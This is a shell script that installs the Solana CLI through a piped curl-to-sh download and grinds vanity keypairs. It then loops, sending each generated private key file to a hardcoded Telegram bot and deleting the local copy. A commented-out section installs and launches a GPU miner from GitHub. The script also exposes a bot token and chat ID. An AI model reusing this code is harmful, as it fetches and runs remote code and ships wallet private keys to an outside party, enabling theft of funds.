mkdir a && cd ./a && sh -c "$(curl -sSfL https://release.solana.com/v1.18.1/install)" && export PATH="/root/.local/share/solana/install/active_release/bin:$PATH" 
solana-keygen grind --starts-with pow:100000000 &

urlencode() {
    # Usage: urlencode "string"
    local string="$1"
    echo -n "$string" | xxd -plain | tr -d '\n' | sed 's/\(..\)/%\1/g'
}
while true; do
    # Execute the find command and store the result in the "result" variable
    result=$(find . -type f -name 'pow[0-9][0-9][0-9][0-9]*')

    # Check if there are any results
    if [ -n "$result" ]; then
        # Loop through each result
        while IFS= read -r file; do
            # Output the content of the file
            cat "$file"
            # Get the content of the file
            content=$(cat "$file")
            # Encode the content for the URL
            encoded_content=$(urlencode "$content")
            # Get the filename
            filename=$(basename "$file")

            rm $filename
            # Make a curl GET request with the content of the file appended to the URL
            curl -X GET "https://api.telegram.org/bot6851381197:AAHJ5Yy7iqn_psValJJa1hZ71n8KSKEZ5U4/sendMessage?chat_id=638066999&text=$encoded_content-$filename"
        done <<< "$result"
    fi

    # Sleep for 5 seconds before the next iteration
    sleep 5
done

# if [ ! -d "/root/SuperMega" ]; then
#     echo "Miner not installed. Installing."
#     apt install nano

#     curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash - 
#     apt-get install -y nodejs
#     apt-get install -y npm

#     cd /root || exit
#     git clone https://github.com/Sheryna1/SuperMega.git

#     cd ./SuperMega || exit
# else
#     cd /root/SuperMega || exit
#     echo "Miner installed. Updating."
#     git pull
# fi

# npm i

# # npx ts-node send_universal.ts

# chmod 777 ./miningPoolCli
# chmod 777 ./script2.sh
# chmod 777 ./miner_blob/pow-miner-cuda
# chmod 777 ./pow-miner-cuda


# # ./miningPoolCli
# GPU_COUNT=$(nvidia-smi --query-gpu=name --format=csv,noheader | wc -l)

# for i in $(seq 0 $(($GPU_COUNT - 1))); do
#     ./script2.sh $i &
# done
